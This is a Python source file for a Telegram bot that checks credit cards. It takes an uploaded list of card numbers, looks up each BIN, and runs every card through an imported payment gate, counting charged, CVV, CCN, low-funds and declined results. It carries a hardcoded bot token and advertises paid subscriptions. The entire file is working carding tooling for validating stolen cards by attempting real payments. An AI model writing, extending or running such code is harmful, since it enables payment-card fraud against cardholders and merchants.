import requests
import telebot, time
from telebot import types
from gatet import Tele
import os

token = '8522580555:AAG_1Dgmkdc980SFS9a75CzLrADVDUM3Zto'
bot = telebot.TeleBot(token, parse_mode="HTML")

OWNER_ID = '1915369904'

@bot.message_handler(commands=["start"])
def start(message):
    if str(message.chat.id) != OWNER_ID:
        bot.reply_to(
            message,
            "You cannot use the bot to contact developers to purchase a bot subscription @Rusisvirus"
        )
        return
    bot.reply_to(message, "𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰❤️")

@bot.message_handler(content_types=["document"])
def main(message):
    if str(message.chat.id) != OWNER_ID:
        bot.reply_to(
            message,
            "You cannot use the bot to contact developers to purchase a bot subscription @Rusisvirus"
        )
        return

    dd = 0
    live = 0
    ch = 0
    ccn = 0
    cvv = 0
    lowfund = 0

    ko = bot.reply_to(message, "𝐏𝐫𝐨𝐜𝐞𝐬𝐬 𝐑𝐮𝐧𝐧𝐢𝐧𝐠 !").message_id
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)

    with open("combo.txt", "wb") as w:
        w.write(ee)

    try:
        with open("combo.txt", "r") as file:
            lino = file.readlines()
            total = len(lino)

            for cc in lino:
                # ===== STOP CHECK =====
                if os.path.exists("stop.stop"):
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=ko,
                        text="𝑺𝑻𝑶𝑷 ✅\n𝑩𝒐𝒕 𝑩𝒚 ➜ @Rusisvirus"
                    )
                    os.remove("stop.stop")
                    return

                try:
                    data = requests.get(
                        'https://bins.antipublic.cc/bins/' + cc[:6]
                    ).json()
                except:
                    data = {}

                brand = data.get('brand', 'Unknown')
                card_type = data.get('type', 'Unknown')
                country = data.get('country_name', 'Unknown')
                country_flag = data.get('country_flag', '')
                bank = data.get('bank', 'Unknown')

                start_time = time.time()
                try:
                    last = str(Tele(cc))
                except:
                    last = 'missing payment form'

                end_time = time.time()
                execution_time = end_time - start_time

                # ===== VIEW TEXT (NO BUTTONS) =====
                view_text = f"""\

• <code>{cc.strip()}</code>

🟢 sᴛᴀᴛᴜs  ➜ <code>{last}</code>

💳 ᴄʜᴀʀɢᴇᴅ  ➜ <code>[ {ch} ]</code>

🔐 ᴄᴄɴ ➜ <code>[ {ccn} ]</code>

🔐 ᴄᴠᴠ ➜ <code>[ {cvv} ]</code>

⚠️ ʟᴏᴡ ғᴜɴᴅs ➜ <code>[ {lowfund} ]</code>

📊 ᴅᴇᴄʟɪɴᴇᴅ ➜ <code>[ {dd} ]</code>

• ᴛᴏᴛᴀʟ ➜ <code>[ {total} ]</code>
"""

                # ===== STOP BUTTON ONLY =====
                markup = types.InlineKeyboardMarkup(row_width=1)
                markup.add(
                    types.InlineKeyboardButton(
                        "⛔ sᴛᴏᴘ ⚠️",
                        callback_data="stop"
                    )
                )

                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=ko,
                    text=view_text,
                    reply_markup=markup
                )

                # ===== RESULT HANDLING =====
                if 'Payment Successful' in last:
                    ch += 1

                elif 'Your card does not support this type of purchase' in last:
                    cvv += 1

                elif 'security code is incorrect' in last or 'security code is invalid' in last:
                    ccn += 1

                elif 'funds' in last:
                    lowfund += 1

                else:
                    dd += 1
                    time.sleep(3)

    except Exception as e:
        print(e)

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=ko,
        text="𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈 𝑫𝒐𝒏𝒆!\n𝑩𝒐𝒕 𝑩𝒚 ➜ @Rusisvirus"
    )

@bot.callback_query_handler(func=lambda call: call.data == "stop")
def stop_callback(call):
    with open("stop.stop", "w") as f:
        pass
    bot.answer_callback_query(call.id, "Stopping...")

# ===== SAFE POLLING =====
import telebot.apihelper as apihelper
apihelper.REQUEST_TIMEOUT = 30

while True:
    try:
        bot.polling(non_stop=True, timeout=20, long_polling_timeout=20)
    except Exception as e:
        print("Polling error:", e)
        time.sleep(5)
